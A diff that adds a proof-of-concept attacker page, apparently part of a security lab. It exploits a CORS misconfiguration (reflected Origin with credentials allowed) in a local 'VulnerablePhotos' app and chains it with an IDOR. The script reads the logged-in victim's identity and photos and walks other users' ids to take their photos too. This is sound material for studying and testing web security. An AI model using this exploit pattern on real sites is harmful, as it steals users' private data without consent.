@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Totally Legit Ad Network</title></head>
+<body>
+<h1>Cross-Origin Credentialed Read Demo</h1>
+<p>
+  VulnerablePhotos reflects any <code>Origin</code> header back in
+  <code>Access-Control-Allow-Origin</code> and sets
+  <code>Access-Control-Allow-Credentials: true</code>. That means a page on
+  <em>this</em> origin can read authenticated API responses from
+  <code>http://127.0.0.1:3000</code> as long as the victim is logged in there
+  in the same browser.
+</p>
+<button onclick="steal()">Steal victim's data</button>
+<pre id="out"></pre>
+
+<script>
+async function steal() {
+  const out = document.getElementById('out');
+  out.textContent = 'Fetching...';
+
+  const whoami = await fetch('http://127.0.0.1:3000/api/whoami', { credentials: 'include' }).then(r => r.json());
+  const myPhotos = await fetch(`http://127.0.0.1:3000/api/users/${whoami.user ? whoami.user.id : 1}/photos`, { credentials: 'include' }).then(r => r.json());
+
+  // IDOR chained through the CORS hole: walk user ids 1..5 cross-origin.
+  const stolen = {};
+  for (let id = 1; id <= 5; id++) {
+    stolen[id] = await fetch(`http://127.0.0.1:3000/api/users/${id}/photos`, { credentials: 'include' }).then(r => r.json());
+  }
+
+  out.textContent = JSON.stringify({ whoami, myPhotos, stolenAcrossUsers: stolen }, null, 2);
+}
+</script>
+</body>
+</html>
